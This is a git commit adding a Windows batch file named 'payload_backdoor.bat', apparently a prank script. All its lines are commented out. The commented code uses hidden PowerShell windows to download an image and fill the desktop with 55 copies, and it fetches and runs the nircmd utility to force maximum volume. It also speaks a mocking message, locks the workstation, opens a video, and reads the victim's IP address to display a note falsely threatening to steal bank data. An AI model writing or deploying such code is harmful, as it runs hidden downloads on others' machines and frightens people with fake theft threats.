d418446f75319e58199438090358c4682bb2436d
ahuici <ahuicidelg1@educacion.navarra.es>
2026-01-19 17:08:50 +0100

    Create payload_backdoor.bat

---
+++ payload_backdoor.bat
@@ -0,0 +1,51 @@
+@echo off
+
+
+
+
+@REM powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://pbs.twimg.com/media/CG_6R6hXAAEnowm.jpg' -OutFile \"$env:TEMP\kaliseParaTodos.png\""
+
+@REM start "" "https://pbs.twimg.com/media/CG_6R6hXAAEnowm.jpg"
+
+@REM powershell -WindowStyle Hidden -Command "for ($i = 1; $i -le 55; $i++) { Copy-Item -Path \"$env:TEMP\kaliseParaTodos.png\" -Destination \"C:\Users\$env:USERNAME\Desktop\kaliseParaTodos$i.png\" }"
+
+@REM set "NIR=%TEMP%\nircmd.exe"
+
+@REM if not exist "%NIR%" (
+@REM     powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://www.nirsoft.net/utils/nircmd.zip' -OutFile \"$env:TEMP\nircmd.zip\"; Add-Type -AssemblyName System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory(\"$env:TEMP\nircmd.zip\", \"$env:TEMP\")"
+@REM )
+
+@REM "%NIR%" mutesysvolume 0
+@REM "%NIR%" setsysvolume 65535
+
+@REM powershell -WindowStyle Hidden -NoProfile -Command "Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Volume = 100; $speak.Speak('KALISE PARA TODOS. Quien quiere un kalise???');"
+
+@REM rundll32.exe user32.dll,LockWorkStation
+
+@REM "%NIR%" mutesysvolume 0
+@REM "%NIR%" setsysvolume 65535
+
+@REM start "" "https://www.youtube.com/watch?v=2iMQcqGK8yg"
+
+@REM timeout /t 10 /nobreak >nul
+
+@REM "%NIR%" mutesysvolume 0
+@REM "%NIR%" setsysvolume 65535
+
+@REM rundll32.exe user32.dll,LockWorkStation
+
+@REM setlocal enabledelayedexpansion
+
+@REM ipconfig | findstr /i "IPv4" > "%TEMP%\ipline.txt"
+
+@REM set "IP="
+@REM for /f "usebackq delims=" %%L in ("%TEMP%\ipline.txt") do (
+@REM     set "linea=%%L"
+@REM     set "IP=!linea:~-15!"
+@REM )
+
+@REM set "IP=%IP: =%"
+
+@REM set "FILE=%TEMP%\mi_ip.txt"
+@REM echo %USERNAME%, se que eres fan de Iniesta. Yo tambien, pero ahora que tengo tu ip %IP% te voy a robar los datos bancarios > "%FILE%"
+@REM start notepad "%FILE%"
